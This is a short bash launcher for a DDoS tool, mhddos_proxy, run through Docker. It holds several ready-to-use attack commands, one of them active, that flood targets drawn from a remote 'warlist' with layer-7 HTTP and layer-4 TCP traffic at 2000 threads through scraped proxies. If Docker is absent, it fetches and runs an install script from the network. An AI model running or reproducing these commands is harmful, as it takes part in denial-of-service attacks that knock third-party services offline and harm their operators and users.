#!/bin/bash

if [ -x "$(command -v docker)" ]
then
	
	#uncheck the attack you wonna run with cpecific target list. only one line have to be left without #
	#u can use own lists. look at official instructions to mhddos_proxy

	#docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest -t 2000 --rpc 1000 -p 350 --table --http-methods STRESS GET -c https://raw.githubusercontent.com/gidiyan/ddos_warlist/main/l7_all.lst --proxies https://raw.githubusercontent.com/OleksandrBlack/proxy-scraper-checker/main/proxies/proxies.txt
	#docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest -t 2000 --rpc 1000 -p 350 --table --http-methods STRESS GET -c https://raw.githubusercontent.com/gidiyan/ddos_warlist/main/l7_443.lst --proxies https://raw.githubusercontent.com/OleksandrBlack/proxy-scraper-checker/main/proxies/proxies.txt
	#docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest -t 2000 --rpc 1000 -p 350 --table --http-methods STRESS GET -c https://raw.githubusercontent.com/gidiyan/ddos_warlist/main/l7_80.lst --proxies https://raw.githubusercontent.com/OleksandrBlack/proxy-scraper-checker/main/proxies/proxies.txt
	#docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest -t 2000 --rpc 1000 -p 350 --table -c https://raw.githubusercontent.com/gidiyan/ddos_warlist/main/l4_tcp_80.lst --proxies https://raw.githubusercontent.com/OleksandrBlack/proxy-scraper-checker/main/proxies/proxies.txt
	#docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest -t 2000 --rpc 1000 -p 350 --table -c https://raw.githubusercontent.com/gidiyan/ddos_warlist/main/l4_tcp_443.lst --proxies https://raw.githubusercontent.com/OleksandrBlack/proxy-scraper-checker/main/proxies/proxies.txt
	#docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest -t 2000 --rpc 1000 -p 350 --table -c https://raw.githubusercontent.com/gidiyan/ddos_warlist/main/l4_tcp_other.lst --proxies https://raw.githubusercontent.com/OleksandrBlack/proxy-scraper-checker/main/proxies/proxies.txt
	docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest -t 2000 --rpc 1000 -p 350 --table -c https://raw.githubusercontent.com/gidiyan/ddos_warlist/main/l4_tcp_all.lst --proxies https://raw.githubusercontent.com/OleksandrBlack/proxy-scraper-checker/main/proxies/proxies.txt
else
	curl -fsSL https://get.docker.com -o get-docker.sh
	sh get-docker.sh 
	./start.sh
fi
